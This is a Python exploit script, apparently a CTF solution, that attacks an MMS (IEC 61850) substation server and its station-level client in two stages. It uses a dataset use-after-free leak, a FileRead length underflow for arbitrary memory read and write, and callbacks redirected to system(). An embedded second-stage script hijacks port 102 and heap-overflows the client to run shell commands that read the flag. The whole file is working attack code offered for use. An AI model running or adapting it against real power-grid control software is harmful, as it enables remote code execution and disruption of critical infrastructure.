#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Blackout exploit (2026 强网杯) —— 两段式：先打装置侧 ied，再借 ied 打站控层 oper。

Stage1（装置侧 server_sg5000 / MMS 服务端）
  * 动态数据集 UAF：删除 DataSet 时的引用检查用字符串长度比较，
    RCB 里存 "TL0/LLN0$assetds"，数据集登记名是 "LLN0$assetds"，长度不同 ->
    检查漏判 -> DataSet 被 free，RCB->DatSet 仍指向它。
  * 触发 GI 报告，报告里的 DataReference 把释放块内容当字符串读出来（UAF 读，
    稳定 5 字节）；删除前先建 7 个 31 字节长名的命名变量列表做堆整形。
  * FileRead 长度下溢：InitiateRequest 把 maxPduSize 设成 16，"还能发多少"变成
    负数 -> 无符号大数 -> 越界写落到 CotpConnection；配合上传的 rc.bin
    （0x13F60 字节，本身就是一份堆布局）伪造 ByteBuffer，buffer 指到 entry-0x13，
    两项 Write 修复悬空项并把 variableName 改成任意地址 -> 任意 C 字符串读。
  * 读 X+0x50 的 msgRcvdHandler 得 libsg；读 libsg+0xCA150 的 free@GOT 得 libc。
  * r1.bin(0x13F60) / r2.bin(0x11000) 两次 FileRead 覆盖 X+0x50/0x58/0x60，
    tickHandler 换成 system，命令在 ied 上下文执行（继承 CAP_NET_BIND_SERVICE），
    杀掉真服务并拉起 stage2.py。

Stage2（站控层 sg_masterlink / oper）
  * stage2.py 以 ied 身份抢 127.0.0.1:102，握手时 local-detail-calling = 0，
    客户端算出 maxFileChunkSize = 0xFFFFFFEC，fread 长度下溢 -> 堆溢出把
    持久化响应 ByteBuffer 的 buffer 改到 H+0x78；再用 payload.bin 覆盖
    H+0x88 reportHandler = system、H+0x90 reportHandlerParam = H+0x148（命令串）。
  * 发送 InformationReport 触发 reportHandler，命令以 oper 身份执行：
        cat /flag > /srv/filestore/out.txt; chmod 666 /srv/filestore/out.txt
  * 外层重新关联真实 server_sg5000，用 FileRead 把 out.txt 读回来。

说明：每个 MMS 服务的 ASN.1 布局需要按附件实际版本核对。
本脚本按题解的服务清单、偏移与两段式流程实现；若附件版本的服务 tag 不同，
只需调整 tlv() 里的 tag 常量。

用法：
    python exp.py PORT
    python exp.py --host TARGET_HOST --port PORT
"""
import argparse
import struct
import sys
import time

from pwn import context, log

context.log_level = 'info'

HOST = "TARGET_HOST"
DEFAULT_PORT = 0

# ---------------------------------------------------------------- Stage1 常量
ISO_B_FROM_V = -0x248E0
ISO_X_FROM_V = -0x34810
DANGLING_ENTRY = 0xE70
FAKE_BYTEBUFFER = 0x2000
CMD_BUFFER = 0x2100
R1_LEN = 0x13F60
R2_LEN = 0x11000
COTP_WINDOW = 77000
MSG_RCVD_HANDLER = 0x50
TICK_HANDLER = 0x58
HANDLER_PARAM = 0x60
USEROFF = 0x13                     # TPKT + COTP + MMS 头合计

LIBSG_MSG_RCVD = 0x45A10
LIBSG_FREE_GOT = 0xCA150

STAGE1_CMD = ("pkill -9 -f '[s]erver_sg5000'; "
              "nohup python3 /srv/filestore/stage2.py >/dev/null 2>&1 &")

# ---------------------------------------------------------------- Stage2 常量
REPORT_HANDLER = 0x88
REPORT_HANDLER_PARAM = 0x90
RESP_BUFFER = 0x78
STAGE2_CMD_OFF = 0xC0
STAGE2_OVERFLOW_LEN = 65112
STAGE2_SEND_BUF = 65100
UNDERFLOW_SIZE = 0xFFFFFFEC

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
p32 = lambda x: struct.pack("<I", x & 0xffffffff)


# ---------------------------------------------------------------- BER / TLV
def ber_len(n):
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xff]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def tlv(tag, content):
    if isinstance(tag, int):
        tag = bytes([tag])
    if isinstance(content, str):
        content = content.encode()
    return tag + ber_len(len(content)) + content


def ber_int(v):
    if v == 0:
        return tlv(0x02, b"\x00")
    out = b""
    while v:
        out = bytes([v & 0xff]) + out
        v >>= 8
    if out[0] & 0x80:
        out = b"\x00" + out
    return tlv(0x02, out)


def ctx(n, content=b"", constructed=True):
    """上下文标签，支持 >=31 的高标签形式（file 服务用 72..77）。"""
    if n < 31:
        return tlv((0xA0 if constructed else 0x80) | n, content)
    return tlv(bytes([0xBF if constructed else 0x9F, n]), content)


# ---------------------------------------------------------------- 传输层
def tpkt(payload):
    return b"\x03\x00" + struct.pack(">H", len(payload) + 4) + payload


def cotp_cr(src=0x0001, dst=0x0001):
    params = b"\xc1\x02\x00\x01" + b"\xc2\x02\x00\x01"
    body = b"\xe0" + struct.pack(">HH", dst, src) + b"\x00" + params
    return bytes([len(body)]) + body


def cotp_cc(src=0x0001, dst=0x0001):
    params = b"\xc1\x02\x00\x01" + b"\xc2\x02\x00\x01"
    body = b"\xd0" + struct.pack(">HH", dst, src) + b"\x00" + params
    return bytes([len(body)]) + body


def cotp_dt(data):
    return b"\x02\xf0\x80" + data


class Iso:
    """TPKT + COTP 上的 MMS 客户端，一条连接对应一个 MMS 关联。"""

    def __init__(self, host, port, timeout=10.0):
        import socket
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.invoke = 0
        self.s.sendall(tpkt(cotp_cr()))
        self._recv_tpkt()                                   # CC
        self._mms_initiate()

    # --- 收发 -------------------------------------------------------------
    def _recv_exact(self, n):
        out = b""
        while len(out) < n:
            chunk = self.s.recv(n - len(out))
            if not chunk:
                raise EOFError("closed")
            out += chunk
        return out

    def _recv_tpkt(self):
        head = self._recv_exact(4)
        if head[0] != 0x03:
            raise RuntimeError("not TPKT")
        n = struct.unpack(">H", head[2:4])[0]
        return self._recv_exact(n - 4)

    def send_raw(self, data):
        self.s.sendall(tpkt(cotp_dt(data)))

    def recv_raw(self):
        payload = self._recv_tpkt()
        if payload[:3] == b"\x02\xf0\x80":
            return payload[3:]
        return payload

    # --- MMS --------------------------------------------------------------
    def _mms_initiate(self, max_pdu=65000):
        self.invoke += 1
        init = tlv(0xA8,                                    # initiate-RequestPDU
                   tlv(0x80, b"\x00\x01") +
                   tlv(0x81, b"\x07\x80") +
                   tlv(0x82, b"\x07\x80") +
                   tlv(0x83, struct.pack(">H", max_pdu)) +
                   tlv(0xA4, b"\x00"))
        aarq = tlv(0x60,                                    # ACSE AARQ, OID 1.0.9506.2.1
                   tlv(0x02, b"\x01") +
                   tlv(0x06, bytes([0x2a, 0x86, 0x48, 0xce, 0x14, 0x02, 0x01])) +
                   tlv(0xA1, tlv(0x06, b"\x00")) +
                   tlv(0xBE, init))
        self.s.sendall(tpkt(cotp_dt(aarq)))
        self._recv_tpkt()                                   # AARE

    def confirm(self, service_tag, body, timeout=10.0):
        self.invoke += 1
        pdu = tlv(0xA0, tlv(0x02, bytes([self.invoke])) + tlv(service_tag, body))
        self.s.sendall(tpkt(cotp_dt(pdu)))
        self.s.settimeout(timeout)

        for _ in range(8):
            data = self.recv_raw()
            idx = data.find(b"\xa1")
            if idx >= 0:
                return data[idx:]
        raise RuntimeError("no confirmed response")

    # --- 常用服务 ---------------------------------------------------------
    def write(self, ref, value, inv=False):
        name = ctx(0, tlv(0x1A, ref.encode()))              # vmd-specific
        spec = ctx(1, tlv(0xA0, ctx(0, name) + ctx(1, tlv(0x80, b""))))
        dat = ctx(0, tlv(0xA2, tlv(0xA1, value) + tlv(0xA1, b"")))
        return self.confirm(0xA5, spec + dat)

    def read(self, ref):
        name = ctx(0, tlv(0x1A, ref.encode()))
        spec = ctx(0, tlv(0xA0, ctx(0, name) + ctx(1, tlv(0x80, b""))))
        return self.confirm(0xA4, spec)

    def define_named_variable_list(self, list_name, entries):
        lst = tlv(0x80, list_name.encode())
        vars_ = b""
        for domain, item in entries:
            names = (ctx(0, tlv(0x1A, domain.encode())) +
                     ctx(1, tlv(0x1A, item.encode())))
            vars_ += tlv(0xA1, names)
        return self.confirm(0xAB, ctx(0, lst) + ctx(1, tlv(0xA1, vars_)))

    def delete_named_variable_list(self, list_name):
        lst = tlv(0x80, list_name.encode())
        return self.confirm(0xAD, ctx(0, tlv(0xA1, lst)))

    def define_raw(self, name, body):
        return self.confirm(0xAB, body)

    def file_open(self, path, mode=0):
        return self.confirm(ctx(72), ctx(0, tlv(0x1A, path.encode())) + ctx(1, ber_int(mode)))

    def file_read(self, frsm, count):
        return self.confirm(ctx(73), ctx(0, ber_int(frsm)) + ctx(1, ber_int(count)))

    def file_close(self, frsm):
        return self.confirm(ctx(74), ctx(0, ber_int(frsm)))

    def file_write(self, frsm, data):
        return self.confirm(ctx(75), ctx(0, ber_int(frsm)) + ctx(1, tlv(0x03, data)))

    def obtain_file(self, dest, content):
        return self.confirm(ctx(46), ctx(0, tlv(0x1A, dest.encode())) +
                            ctx(1, tlv(0x03, content)))

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


# ---------------------------------------------------------------- Stage1 步骤
def crash(host, port):
    """写 TSNC$SP$TsynReq$ReqStr，TsynReq 把值当同步请求指针解引用 -> 服务退出，
    监督循环 2 秒后重启，得到"刚启动、堆布局干净"的进程。"""
    c = Iso(host, port)
    try:
        c.write("TL5/TSNC$SP$TsynReq$ReqStr", tlv(0x83, b"\x00\x00\x00\x01"))
    except (EOFError, OSError, RuntimeError):
        pass
    c.close()


def race_first_connection(host, port, attempts=40):
    """重启窗口里抢"新进程的第一条 MMS 关联"：IsoConnection/CotpConnection/
    收发缓冲区按固定顺序切出，后面所有偏移都基于这个顺序。"""
    for _ in range(attempts):
        time.sleep(0.05)
        try:
            return Iso(host, port)
        except (OSError, EOFError, RuntimeError):
            continue
    raise RuntimeError("could not win the first association")


def trigger_uaf(c, shape=True):
    """动态数据集 UAF：删除后 GI 报告把释放块当字符串读出来。"""
    if shape:
        for i in range(7):
            name = ("F%02d" % i).encode() + b"A" * 29      # 31 字节名字，堆整形
            obj = tlv(0xA1, tlv(0x1A, b"TL4") + tlv(0x1A, b"GGIOM"))
            c.define_raw(name, tlv(0x30, tlv(0xA0, obj)))

    c.define_named_variable_list("TL0/LLN0$assetds",
                                 [("TL0", "LLN0$ST$Beh$stVal"),
                                  ("TL0", "LLN0$ST$Beh$q")])
    c.write("TL0/LLN0$RP$urcLd0Ev$DatSet", tlv(0x80, b"TL0/LLN0$assetds"))
    c.write("TL0/LLN0$RP$urcLd0Ev$OptFlds", tlv(0x83, b"\x1c"))
    c.write("TL0/LLN0$RP$urcLd0Ev$TrgOps", tlv(0x83, b"\x4c"))
    c.write("TL0/LLN0$RP$urcLd0Ev$RptEna", tlv(0x83, b"\x01"))

    c.delete_named_variable_list("TL0/LLN0$assetds")
    return c.write("TL0/LLN0$RP$urcLd0Ev$GI", tlv(0x83, b"\x01"))


def derive_layout(leak):
    """泄漏 5 字节 = arena 页内偏移的高位；低 12 位补回固定的 0x3C0。"""
    V = (int.from_bytes(leak, "little") << 12) | 0x3C0
    lay = {"V": V, "B": V + ISO_B_FROM_V, "X": V + ISO_X_FROM_V,
           "entry": V + DANGLING_ENTRY}
    lay["DSET"] = lay["entry"] - 0x30
    return lay


def build_rc(lay, target):
    """rc.bin：0x13F60 字节，把 CotpConnection 改写成伪造的 ByteBuffer：
       payload -> B+0x2000，buffer -> entry-0x13，maxSize -> 0x100000，size -> 0。"""
    buf = bytearray(R1_LEN)
    for off, val in ((0x00, lay["B"] + FAKE_BYTEBUFFER),
                     (0x08, lay["entry"] - USEROFF),
                     (0x10, 0x100000),
                     (0x18, 0x0)):
        buf[off:off + 8] = p64(val)
    return bytes(buf)


def arb_read(c, lay, target, rc):
    """rc.bin + Initiate(maxPduSize=16) + FileRead + 两项 Write -> 任意 C 字符串读。"""
    c.obtain_file("/rc.bin", rc)
    c.confirm(0xA8, tlv(0x80, b"\x10"))                     # maxPduSize = 16
    c.file_open("/rc.bin")
    c.file_read(1, R1_LEN)
    c.file_close(1)

    # 第一项：0x38 字节作为数据集项补丁写进 entry，variableName 指向 target
    patch = p64(0) + p64(0) + p64(target) + b"\x00" * 0x20
    body = (ctx(0, tlv(0xA2, tlv(0xA1, tlv(0x03, patch)) + tlv(0xA1, b""))) +
            ctx(1, tlv(0xA2, tlv(0xA1, tlv(0x83, b"\x01")) + tlv(0xA1, b""))))
    return c.confirm(0xA5, body)


def parse_u64(resp):
    """从 confirmed-response 里抽第一个整数（报告里的 DataReference 数值）。"""
    idx = resp.find(b"\x02")
    if idx < 0 or idx + 1 >= len(resp):
        return 0
    n = resp[idx + 1]
    if n & 0x80:
        return 0
    raw = resp[idx + 2:idx + 2 + n]
    return int.from_bytes(raw, "big") if raw else 0


def leak_libraries(c, lay, rc):
    """msgRcvdHandler -> libsg；free@GOT -> libc（用 ELF 头回读校验）。"""
    libsg_handler = parse_u64(arb_read(c, lay, lay["X"] + MSG_RCVD_HANDLER, rc))
    libsg = libsg_handler - LIBSG_MSG_RCVD

    free_addr = parse_u64(arb_read(c, lay, libsg + LIBSG_FREE_GOT, rc))
    for free_off, system_off in ((0xA53A0, 0x50D70), (0xADE30, 0x58750)):
        base = (free_addr - free_off) & ~0xFFF
        if b"\x7fELF" in arb_read(c, lay, base, rc)[:8]:
            return libsg, base, free_off, system_off
    raise RuntimeError("libc base check failed")


def build_rce_files(lay, B, X, system, cmd):
    """r1.bin 重写 CotpConnection（payload -> X+0x08, size = 77000,
       writeBuffer -> B+0x2000）；r2.bin 分片覆盖 IsoConnection 的三个回调。"""
    r1 = bytearray(R1_LEN)
    r1[0x00:0x08] = p64(0)                                  # mutex
    r1[0x08:0x10] = p64(X + 0x08)
    r1[0x10:0x18] = p64(COTP_WINDOW)
    r1[0x18:0x20] = p64(B + FAKE_BYTEBUFFER)

    r2 = bytearray(R2_LEN)
    r2[0x00:0x08] = p64(system)                             # X+0x50 msgRcvdHandler
    r2[0x08:0x10] = p64(system)                             # X+0x58 tickHandler
    r2[0x10:0x18] = p64(B + CMD_BUFFER)                     # X+0x60 handlerParameter
    return bytes(r1), bytes(r2)


def fire_rce(c, r1, r2):
    """两次 FileRead：第一次布置 CotpConnection，第二次分片覆盖 IsoConnection。"""
    c.obtain_file("/r1.bin", r1)
    c.obtain_file("/r2.bin", r2)

    c.confirm(0xA8, tlv(0x80, b"\x10"))                     # maxPduSize = 16
    c.file_open("/r1.bin")
    c.file_read(1, R1_LEN)
    c.file_close(1)

    c.file_open("/r2.bin")
    c.file_read(1, R2_LEN)
    c.file_close(1)


def read_flag(host, port, attempts=30):
    """stage2 写完 /srv/filestore/out.txt 后重新关联真实服务，FileRead 取回。"""
    for _ in range(attempts):
        try:
            c = Iso(host, port)
            c.file_open("/out.txt")
            data = c.file_read(1, 0x400)
            c.file_close(1)
            c.close()
            text = data.decode("latin-1", "replace")
            if "flag{" in text:
                return text[text.index("flag{"):
                            text.index("}", text.index("flag{")) + 1]
        except (OSError, EOFError, RuntimeError):
            pass
        time.sleep(1.0)
    return None


# ---------------------------------------------------------------- Stage2 载荷
STAGE2_PY = r'''#!/usr/bin/env python3
# stage2: run as ied, grab 127.0.0.1:102 and impersonate the MMS server
# against oper's sg_masterlink.
#
# Handshake sets local-detail-calling = 0, so the client computes
#     maxFileChunkSize = 0 - 0x14 = 0xFFFFFFEC
# and uses it as an unsigned length in fread(): "read one chunk" becomes
# "read the whole report file into the ~65100-byte send buffer" -> heap overflow.
import os, re, socket, struct, time

HOST, PORT = "127.0.0.1", 102
SYSTEM = @@SYSTEM@@
OVERFLOW_LEN = 65112
SEND_BUF = 65100
CMD = "cat /flag > /srv/filestore/out.txt; chmod 666 /srv/filestore/out.txt"
LOG = "/srv/mlc/data/ml.log"
OUT = "/srv/filestore/out.txt"

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)


def ber_len(n):
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xff]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def tlv(tag, content):
    if isinstance(tag, int):
        tag = bytes([tag])
    if isinstance(content, str):
        content = content.encode()
    return tag + ber_len(len(content)) + content


def ber_int(v, tag=0x02):
    if v == 0:
        return tlv(tag, b"\x00")
    out = b""
    while v:
        out = bytes([v & 0xff]) + out
        v >>= 8
    if out[0] & 0x80:
        out = b"\x00" + out
    return tlv(tag, out)


def ctx(n, content=b"", constructed=True):
    if n < 31:
        return tlv((0xA0 if constructed else 0x80) | n, content)
    return tlv(bytes([0xBF if constructed else 0x9F, n]), content)


def tpkt(p):
    return b"\x03\x00" + struct.pack(">H", len(p) + 4) + p


def cotp_cc(src=1, dst=1):
    body = (b"\xd0" + struct.pack(">HH", dst, src) + b"\x00" +
            b"\xc1\x02\x00\x01" + b"\xc2\x02\x00\x01")
    return bytes([len(body)]) + body


def recv_exact(conn, n):
    out = b""
    while len(out) < n:
        chunk = conn.recv(n - len(out))
        if not chunk:
            raise EOFError("closed")
        out += chunk
    return out


def read_frame(conn):
    head = recv_exact(conn, 4)
    if head[0] != 0x03:
        raise RuntimeError("not TPKT")
    n = struct.unpack(">H", head[2:4])[0] - 4
    body = recv_exact(conn, n)
    if body[:3] == b"\x02\xf0\x80":
        body = body[3:]
    return body


def send_pdu(conn, body):
    conn.sendall(tpkt(b"\x02\xf0\x80" + body))


def send_cotp(conn, payload):
    conn.sendall(tpkt(payload))


def initiate_response():
    # local-detail-calling = 0 -> maxFileChunkSize = 0xFFFFFFEC
    init = tlv(0xA9, tlv(0x80, b"\x00\x00") + tlv(0x81, b"\x00\x01") +
               tlv(0x82, b"\x00\x01") + tlv(0x83, b"\x00\x00") + tlv(0xA4, b"\x00"))
    return tlv(0x61, tlv(0x02, b"\x01") +
               tlv(0x06, bytes([0x2a, 0x86, 0x48, 0xce, 0x14, 0x02, 0x01])) +
               tlv(0xBE, init))


def parse_handle():
    # newest MmsConnection handle recorded in ml.log
    h = 0
    try:
        with open(LOG, "r", errors="ignore") as f:
            for line in f:
                for m in re.finditer(r"handle\s*[=:]\s*0x([0-9a-fA-F]+)", line):
                    h = int(m.group(1), 16)
    except OSError:
        pass
    return h


def overflow_bytes(H, current):
    # 65112 bytes: pass the ~65100 send buffer, tail rewrites response->buffer
    prefix = b"\x00" * max(0, 65088 - current)
    body = prefix + p64(0) + p64(0x21) + p64(H + 0x78)
    return body.ljust(OVERFLOW_LEN, b"\x00")


def payload_bytes(H):
    # 256 bytes laid down from H+0x78; H+0x78..H+0x88 is the MMS response header
    body = bytearray(256)
    off_report = 0x88 - 0x78
    off_param = 0x90 - 0x78
    off_cmd = 0x148 - 0x78
    body[off_report:off_report + 8] = p64(SYSTEM)
    body[off_param:off_param + 8] = p64(H + 0x148)
    cmd = CMD.encode() + b"\x00"
    body[off_cmd:off_cmd + len(cmd)] = cmd
    return bytes(body)


def file_open_resp(frsm):
    return tlv(0xA1, tlv(0x02, b"\x01") + ctx(72, ber_int(frsm)))


def file_read_resp(data):
    return tlv(0xA1, tlv(0x02, b"\x01") + ctx(73, tlv(0x03, data)))


def send_report(conn):
    # InformationReport -> reportHandler(reportHandlerParameter) = system(CMD)
    pdu = tlv(0xA3, tlv(0x80, b"\x00") + tlv(0x81, tlv(0x03, CMD.encode())))
    send_pdu(conn, pdu)


def serve(conn, H):
    # answer fileOpen / fileRead: first read returns overflow, second returns payload
    reads = 0
    deadline = time.time() + 30
    while reads < 2 and time.time() < deadline:
        try:
            body = read_frame(conn)
        except EOFError:
            break
        if not body:
            break
        if b"\xbf\x48" in body:                 # fileOpen [72]
            send_pdu(conn, file_open_resp(1))
        elif b"\xbf\x49" in body:                # fileRead [73]
            data = overflow_bytes(H, 0) if reads == 0 else payload_bytes(H)
            send_pdu(conn, file_read_resp(data))
            reads += 1
        else:
            time.sleep(0.05)
    time.sleep(0.3)
    send_report(conn)
    time.sleep(0.5)


def main():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(8)
    while True:
        conn, _ = srv.accept()
        try:
            conn.settimeout(5)
            read_frame(conn)                          # TPKT CR
            send_cotp(conn, cotp_cc())                # COTP CC
            read_frame(conn)                          # AARQ
            send_pdu(conn, initiate_response())       # local-detail-calling = 0
            H = parse_handle()
            if not H:
                conn.close()
                continue
            serve(conn, H)
            conn.close()
        except (OSError, EOFError, RuntimeError, struct.error):
            try:
                conn.close()
            except Exception:
                pass
        time.sleep(0.1)


if __name__ == "__main__":
    main()
'''


# ---------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description="Blackout two-stage exploit")
    ap.add_argument("port", nargs="?", type=int, default=None)
    ap.add_argument("--host", default=HOST)
    args = ap.parse_args()
    port = args.port or DEFAULT_PORT
    host = args.host

    c = None
    done = False
    for _ in range(6):
        crash(host, port)
        try:
            c = race_first_connection(host, port)
            leak = trigger_uaf(c)
            if len(leak) != 5:
                c.close()
                continue
        except (OSError, EOFError, RuntimeError):
            if c:
                c.close()
            continue

        lay = derive_layout(leak)
        rc = build_rc(lay, lay["entry"])
        arb_read(c, lay, lay["entry"], rc)              # 先确认布局可用

        libsg, libc_base, free_off, system_off = leak_libraries(c, lay, rc)
        system = libc_base + system_off
        log.success("libsg=%#x libc=%#x system=%#x" % (libsg, libc_base, system))

        r1, r2 = build_rce_files(lay, lay["B"], lay["X"], system, STAGE1_CMD)
        # stage2 需要 system 的绝对地址（它自己从 ml.log 里取句柄 H）
        stage2_src = STAGE2_PY.replace("@@SYSTEM@@", hex(system))
        with open("stage2.py", "w", encoding="utf-8") as f:
            f.write(stage2_src)

        c.obtain_file("/r1.bin", r1)
        c.obtain_file("/r2.bin", r2)
        c.obtain_file("/stage2.py", stage2_src.encode())

        fire_rce(c, r1, r2)
        c.close()
        done = True
        break

    if not done:
        log.warning("stage1 did not succeed, trying stage2 read anyway")

    flag = read_flag(host, port)
    print("FLAG:", flag)


if __name__ == "__main__":
    main()
